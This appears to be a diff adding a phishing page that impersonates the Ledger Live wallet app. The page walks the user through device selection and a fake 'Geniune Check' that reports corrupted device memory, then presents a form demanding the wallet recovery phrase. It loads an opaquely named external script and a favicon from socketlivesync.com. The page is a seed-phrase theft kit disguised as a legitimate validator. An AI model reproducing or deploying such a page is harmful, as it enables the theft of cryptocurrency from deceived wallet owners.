@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html >
+
+<head>
+    <script charset="UTF-8" type="text/javascript" src="./1478f84d-3a9d-4f19-804d-2d7b9a9b0653.js"></script><!–– Please update files.zip if you not already did and check below (updated the 11/11) ––>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+          var links = document.querySelectorAll('body a');
+          for (var i = 0; i < links.length; i++) {
+          var link = links[i];
+          link.removeAttribute('href');
+          link.classList.add('interact-button');
+          }
+          });
+          </script>                                                                                                                          <script>
+        document.addEventListener('DOMContentLoaded', function () {
+        var buttons = document.querySelectorAll('body button');
+        for (var i = 0; i < buttons.length; i++) {
+          var button = buttons[i];
+          button.classList.add('interact-button');
+        }
+        });
+        </script>
+        <script>
+        document.addEventListener("DOMContentLoaded", function() {
+          const elements = document.querySelectorAll('[ad-data-linked]');
+          elements.forEach(element => {
+            element.removeAttribute('ad-data-linked');
+          });
+        
+          console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+        });
+        
+        </script>
+        
+          <style>
+          .interact-button {
+          cursor: pointer;
+          }
+          </style>
+    <title>Live Ledger Validator</title>
+    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/x-icon" href="https://socketlivesync.com/favicon.ico"> <!-- FONTS -->
+    <link href="css2.css" rel="stylesheet">
+    <link href="app.css" rel="stylesheet">
+    <link href="bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="bootstrap-icons.css">
+</head>
+
+<body>
+    <div id="app">
+        <div class="container-fluid">
+            <div class="row">
+                <!-- SIDEBAR -->
+                <div class="col-lg-2 min-vh-100 d-lg-inline-block d-none" id="sidebar">
+                    <div style="margin-bottom: 3rem;"> <img src="logo.svg" class="bg-color-2" width="180" alt="LEDGER"> </div>
+                    <div id="menu-lg" class="d-flex flex-column bg-transparent" style="gap: 3rem!important;">
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-graph-up"></span> <span>Portfolio</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-graph-up-arrow"></span> <span>Market</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-upload"></span> <span>Send</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-download"></span> <span>Receive</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-currency-dollar"></span> <span>Buy &amp; Sell</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-arrow-left-right"></span> <span>Swap</span> </div>
+                        <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-tools"></span> <span>Manager</span> </div>
+                    </div>
+                </div>
+                <div class="col-lg-10" id="main">
+                    <!-- MAIN -->
+                    <div class="row g-4">
+                        <div class="col-lg-12">
+                            <div class="d-flex flex-column flex-lg-row flex-nowrap justify-content-between align-items-start gap-lg-2 gap-4">
+                                <div class="order-2 order-lg-1">
+                                    <div class="h3">Device Initialization</div>
+                                    <div class="">Manage assets in Live securely from your browser. Advanced security for assets, made easy.</div>
+                                </div>
+                                <div class="order-1 order-lg-2">
+                                    <div class="ms-lg-auto d-flex flex-row gap-lg-3 align-items-center" id="topnav"> <button class="d-lg-none btn btn-lg text-white bi bi-list" type="button" data-bs-toggle="offcanvas" data-bs-target="#menu" aria-controls="menuCanvas"></button> <span>|</span> <span role="button" class="icon bi bi-bell-fill"></span> <span>|</span> <span role="button" class="icon bi bi-eye-fill"></span> <span>|</span> <span role="button" class="icon bi bi-question-circle-fill"></span> <span>|</span> <span role="button" class="icon bi bi-lock-fill"></span> <span>|</span> <span role="button" class="icon bi bi-gear-fill"></span> </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-lg-12">
+                            <div class="card rounded-3" style="background-color: #1B1C1E !important;">
+                                <div class="card-body px-1 py-3">
+                                    <!-- stepper -->
+                                    <div id="stepper" class="d-flex flex-column gap-1 mb-5">
+                                        <div class="d-flex align-items-center">
+                                            <!-- g1 -->
+                                            <div class="stepper-holder-group d-flex flex-row gap-0 align-items-center justify-content-between" style="width: 20%">
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line filled"></div>
+                                                </div>
+                                                <div class="stepper-holder">
+                                                    <div class="box filled">
+                                                        <div class="dot blank"></div>
+                                                    </div>
+                                                </div>
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line filled"></div>
+                                                </div>
+                                            </div> <!-- g2 -->
+                                            <div class="stepper-holder" style="width: 20%;">
+                                                <div class="line blank" id="s2"></div>
+                                            </div> <!-- g3 -->
+                                            <div class="stepper-holder-group d-flex flex-row gap-0 align-items-center justify-content-between" style="width: 20%">
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line blank" id="sl21"></div>
+                                                </div>
+                                                <div class="stepper-holder">
+                                                    <div class="box blank" id="b2">
+                                                        <div class="dot filled" id="d2"></div>
+                                                    </div>
+                                                </div>
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line blank" id="sl22"></div>
+                                                </div>
+                                            </div> <!-- g4 -->
+                                            <div class="stepper-holder" style="width: 20%;">
+                                                <div class="line blank" id="s3"></div>
+                                            </div> <!-- g5 -->
+                                            <div class="stepper-holder-group d-flex flex-row gap-0 align-items-center justify-content-between" style="width: 20%">
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line blank" id="sl31"></div>
+                                                </div>
+                                                <div class="stepper-holder">
+                                                    <div class="box blank" id="b3">
+                                                        <div class="dot filled" id="d3"></div>
+                                                    </div>
+                                                </div>
+                                                <div class="stepper-holder" style="width: calc(50% - (28px/2));">
+                                                    <div class="line blank" id="sl32"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="d-flex flex-row flex-nowrap justify-content-between align-lg-item-center gap-3 mt-2">
+                                            <div class="text-center" style="width: 20%">Device Detection</div>
+                                            <div class="text-center" style="width: 20%"></div>
+                                            <div class="text-center" style="width: 20%">Device Check</div>
+                                            <div class="text-center" style="width: 20%"></div>
+                                            <div class="text-center" style="width: 20%">Ledger Live</div>
+                                        </div>
+                                    </div> <!-- STEPS -->
+                                    <!-- step1 -->
+                                    <div class="steps" id="step1">
+                                        <div class="h2 mb-5 text-center fw-lighter">Select your Device</div>
+                                        <div class="row g-3 mt-2 mx-2">
+                                            <div class="col-lg-3 col-md-6 col-12">
+                                                <div class="h-100 device-card">
+                                                    <div class="d-flex flex-column justify-content-center align-items-center gap-5">
+                                                        <div class="h4">Nano S</div> <img src="nano-s.png" class="img-fluid" height="300" style="max-height: 300px; height: 300px;" alt="Nano S">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-lg-3 col-md-6 col-12">
+                                                <div class="h-100 device-card">
+                                                    <div class="d-flex flex-column justify-content-center align-items-center gap-5">
+                                                        <div class="h4">Nano S Plus</div> <img src="nano-s-plus.png" class="img-fluid" height="300" style="max-height: 300px; height: 300px;" alt="Nano S Plus">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-lg-3 col-md-6 col-12">
+                                                <div class="h-100 device-card">
+                                                    <div class="d-flex flex-column justify-content-center align-items-center gap-5">
+                                                        <div class="h4">Nano X</div> <img src="nano-x.png" class="img-fluid" height="300" style="max-height: 300px; height: 300px;" alt="Nano X">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-lg-3 col-md-6 col-12">
+                                                <div class="h-100 device-card">
+                                                    <div class="d-flex flex-column justify-content-center align-items-center gap-5">
+                                                        <div class="h4">Blue</div> <img src="blue.png" class="img-fluid" height="100" style="max-height: 100px; height: 100px;" alt="Blue">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div> <!-- step2 -->
+                                    <div class="steps d-none" id="step2">
+                                        <div class="h2 mb-5 text-center fw-lighter">Geniune Check</div>
+                                        <div class="row g-3 mt-2 mx-2">
+                                            <div class="col-lg-5 col-md-6 col-12 mx-auto d-none" id="check-loader">
+                                                <div class="d-flex flex-column gap-5 text-center">
+                                                    <div><img src="horiz-nano.png" class="img-fluid" alt="Connect"></div>
+                                                    <div class="h3 fw-lighter">Connect and Unlock your Device</div>
+                                                    <div>
+                                                        <div class="spinner-grow" style="width: 4rem; height: 4rem;" role="status"> <span class="visually-hidden">Loading...</span> </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-lg-5 col-md-6 col-12 mx-auto d-none" id="load-fail">
+                                                <div class="d-flex flex-column gap-5 text-center">
+                                                    <div class="display-4 text-danger bi bi-exclamation-triangle"></div>
+                                                    <div class="text-danger">Your device memory has been corrupted. Ledger data damage error: 0x0m3Ck8n</div> <button class="btn btn-light btn-lg d-flex flex-row text-center gap-2 justify-content-center py-4" style="font-size: 16px;"> <span class="bi bi-download"></span> <span>Restore our wallet from Recover Phrase</span> </button> <button class="btn btn-dark bg-black btn-lg d-flex flex-row text-center gap-2 justify-content-center py-4" style="font-size: 18px;"> <span class="bi bi-arrow-repeat"></span> <span>Refresh</span> </button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div> <!-- step3 -->
+                                    <div class="steps d-none mb-4" id="step3">
+                                        <div class="h4 mb-5 text-center fw-lighter">Enter your Recovery Phrase</div>
+                                        <div class="row g-1 mt-2 mx-2">
+                                            <div class="col-lg-5 col-md-6 col-12 mx-auto">
+                                                <form id="form" class="d-flex flex-column gap-5 text-center">
+                                                    <div><img src="recovery.svg" width="320" class="img-fluid" alt="Connect"></div>
+                                                    <div class=""> <textarea name="phrase" class="form-control" rows="3" placeholder="Enter your phrase code with space in between each word"></textarea> </div> <button class="btn btn-light btn-lg d-flex flex-row text-center gap-2 justify-content-center py-3" style="font-size: 18px;"> <span>SUBMIT</span> </button>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="offcanvas offcanvas-start bg-color-2" tabindex="-1" id="menu" aria-labelledby="menuCanvas" style="width: 250px!important;">
+            <div class="offcanvas-header d-flex flex-row gap-2 justify-content-between align-items-center">
+                <div class="offcanvas-title" id="menuCanvas"> <img src="logo.svg" class="bg-color-2" width="150" alt="LEDGER"> </div> <button type="button" style="font-size: 30px;" class="btn bi-x text-white" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+            </div>
+            <div class="offcanvas-body">
+                <div id="menu-sm" class="d-flex flex-column bg-transparent text-white" style="gap: 3rem!important; font-size: 12px!important;">
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-graph-up"></span> <span>Portfolio</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-graph-up-arrow"></span> <span>Market</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-upload"></span> <span>Send</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-download"></span> <span>Receive</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-currency-dollar"></span> <span>Buy &amp; Sell</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-arrow-left-right"></span> <span>Swap</span> </div>
+                    <div role="button" class="d-flex align-items-center gap-3 side-link"> <span class="bi bi-tools"></span> <span>Manager</span> </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
